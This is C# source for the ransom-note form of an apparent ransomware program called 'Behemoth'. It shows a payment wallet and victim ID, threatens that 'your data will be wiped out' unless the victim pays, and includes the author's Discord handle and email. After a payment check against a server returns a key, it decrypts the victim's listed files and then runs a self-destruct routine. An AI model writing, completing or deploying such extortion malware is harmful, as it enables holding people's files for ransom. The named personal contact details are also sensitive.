using System.Configuration;

namespace Behemoth
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            string wAddr = Properties.Settings.Default.wAddr;
            richTextBox1.Text = wAddr;
            richTextBox1.SelectAll();
            richTextBox1.SelectionAlignment = HorizontalAlignment.Center;

            string uid = Properties.Settings.Default.uid;
            richTextBox2.Text = uid;
            richTextBox2.SelectAll();
            richTextBox2.SelectionAlignment = HorizontalAlignment.Center;

            richTextBox3.Text = "c0nstant strikes again\ncontact me on discord @c0nstant or even better, " +
                                "how about an email?\nkasra.constant@proton.me";
            richTextBox3.SelectAll();
            richTextBox3.SelectionAlignment = HorizontalAlignment.Center;

            richTextBox4.AutoSize = true;

            var end = Properties.Settings.Default.End;
            richTextBox4.Text = $"Your data will be wiped out at {end}, pay up..";
            richTextBox4.SelectAll();
            richTextBox4.SelectionAlignment = HorizontalAlignment.Center;
        }


        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            string uid = Properties.Settings.Default.uid;
            string resp = Program.CheckUser(uid);

            if (resp.Contains("SUCCESS"))
            {
                string[] KeyIVPairs = resp.Split('|');
                string KEY = KeyIVPairs[1];
                string IV = KeyIVPairs[2];

                MessageBox.Show($"Payment was successfull. Decryption will begin now.");

                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string pathsFile = Path.Combine(desktop, "file_paths.txt");
                var paths = File.ReadLines(pathsFile).ToList();

                ProgressBar pBar = new ProgressBar();
                progressBar1.Minimum = 0;
                progressBar1.Maximum = paths.Count;
                progressBar1.Step = 1;

                foreach (string path in paths)
                {
                    try
                    {
                        Program.AES_Decrypt(path, KEY, IV);
                    }
                    catch { }
                    progressBar1.PerformStep();
                }


                MessageBox.Show("Decryption was successful. Exiting.");
                Program.Sdstrct();
                Application.Exit();
            }
            else
            {
                MessageBox.Show("Payment failed, try again or contact us.");
            }
        }


        
    }
}